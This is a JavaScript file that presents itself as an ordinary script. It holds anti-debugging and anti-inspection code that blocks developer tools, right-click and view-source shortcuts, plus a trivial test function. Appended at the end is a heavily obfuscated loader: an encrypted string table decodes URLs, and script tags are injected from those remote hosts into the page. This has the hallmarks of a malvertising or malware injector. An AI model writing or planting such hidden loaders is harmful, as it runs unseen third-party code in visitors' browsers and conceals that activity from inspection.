 
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(3(){(3 a(){8{(3 b(2){7((\'\'+(2/2)).6!==1||2%5===0){(3(){}).9(\'4\')()}c{4}b(++2)})(0)}d(e){g(a,f)}})()})();',17,17,'||i|function|debugger|20|length|if|try|constructor|||else|catch||5000|setTimeout'.split('|'),0,{}))
 $(document).keydown(function(e){
    if(e.which === 123){
       return false;
    }
});
$(document).bind("contextmenu",function(e) {
 e.preventDefault();
});
function disableClick(){ 
        document.onclick=function(event){ 
          if (event.button == 2) { 
            alert('Right Click Message'); 
            return false; 
          } 
        } 
      } 
 

    function mousehandler(e) {
        var myevent = (isNS) ? e : event;
        var eventbutton = (isNS) ? myevent.which : myevent.button;
        if ((eventbutton == 2) || (eventbutton == 3)) return false;
    }
    document.oncontextmenu = mischandler;
    document.onmousedown = mousehandler;
    document.onmouseup = mousehandler;
    function disableCtrlKeyCombination(e) {
        var forbiddenKeys = new Array("a", "s", "c", "x","u");
        var key;
        var isCtrl;
        if (window.event) {
            key = window.event.keyCode;
            //IE
            if (window.event.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        else {
            key = e.which;
            //firefox
            if (e.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        if (isCtrl) {
            for (i = 0; i < forbiddenKeys.length; i++) {
                //case-insensitive comparation
                if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
                    return false;
                }
            }
        }
        return true;
    }
// JavaScript Document
function testfunc(){
    alert("It works...");
}

/*<![CDATA[/* */
(function(){var c07a2cec233db6e7b935f1067ff49f63="EaQfgb3BFu2Rq9tW16HSBjtp5EjoDIxYHqTVS7i-TWMH6STiAxafvsIcO6o0wnYqGU9YXbdX-86ZQcPFuVlm";var b=['wozCrMOTWEw/w6Yow6zDnsK/Ng7DlcKxO8Ovwp3Dj8KdZA==','BcKZVcODwrM1wqMdw6cpw7fDh10=','LMOmYcK4w4xUSw1gTcOmG8OA','ci/Cqm3DjxYFwpzDosOpe8OTwqcUPMKgw48hw6lLwpnDj1nCkWhGwqAgATXDisKCbMO3HMOjZsKLNHgRwpxR','w6jCh3DCh0ouAQ==','wrxqPCI1ZMOnXEZwwrco','wp1SbMKAwoFZw53DhDDDgg==','VDDDsMOwYsO3MkMTw45NZcKgRsOD','w7ECfw==','wrbDucOpw6/DqsO4','w4cNIUdmPsKJeQ==','wpJIw7EXdiwEw6jCr2sibw==','SsO4wrPCgw==','wqvCrCvChMOCdUnDkMKFCwJyw7Ab','wpkeCGlW','w7XDvsO0K8KQPiQ=','w7vDrcK1wph0wrnCo8K0','YMKiw6PDhMOfw43CvTbDu8OIw7vCmCDCnmDCrRLCpgZQ','YcOxwqzClg==','w5PDm8OzXznDnQ==','D8O2NMKhwrfCicKbw4YCwpIRHx3CoHfDscOmwq/CucKbwoYMw6EHKQVHw54hw6BQCTXDuR8xwrTCqn3Dsj/DiSjDjQ==','wprCtcOLGEYzw7gpw7g=','wpFQw7ZUeykEw5HCu3cwa8KLFMOAelfDmsKgw741wqzDkzw=','wo5BccKWwpxiw6HDgjPDjsKn','w5ciwrnChMKTwo9xdU3CnQJr','BUYzHy00','Tzgj','TTzDpsOGJMO5','w53DpCrCksKCAcKfOA=='];(function(a,c){var f=function(g){while(--g){a['push'](a['shift']());}};f(++c);}(b,0x9b));var c=function(a,d){a=a-0x0;var e=b[a];if(c['ULnvkl']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};c['dAcGOv']=g;c['YcPREW']={};c['ULnvkl']=!![];}var f=c['YcPREW'][a];if(f===undefined){if(c['WXiPzn']===undefined){c['WXiPzn']=!![];}e=c['dAcGOv'](e,d);c['YcPREW'][a]=e;}else{e=f;}return e;};var w=window;w[c('0x8','Xtr2')]=[[c('0x1c','JQj]'),0x4696b4],[c('0x11','&L0Q'),0x0],[c('0x3','G7wM'),c('0x1b','PKx8')],[c('0x18','%!)r'),0x0],[c('0x5','tmbJ'),![]],[c('0x14','C7yt'),0x0],[c('0x1','teqy'),!0x0]];var s=[c('0xa','@KP5'),c('0x16','vX89'),c('0x13','pYwl'),c('0xc','teqy')],i=0x0,z,a=function(){if(!s[i])return;z=w[c('0x12','NbI(')][c('0x15','EHG&')](c('0xf','7nA3'));z[c('0x2','Xtr2')]=c('0x1a','&L0Q');z[c('0x4','uP&I')]=!0x0;var d=w[c('0x6','h0fJ')][c('0x7','XcT5')](c('0x9','3w!F'))[0x0];z[c('0x10','9b2Y')]=c('0x0','8waY')+s[i];z[c('0xd','Z#(z')]=c('0xb','pYwl');z[c('0x17','B4T4')]=function(){i++;a();};d[c('0x19','Z#(z')][c('0xe',')Zk)')](z,d);};a();})();
/*]]>/* */

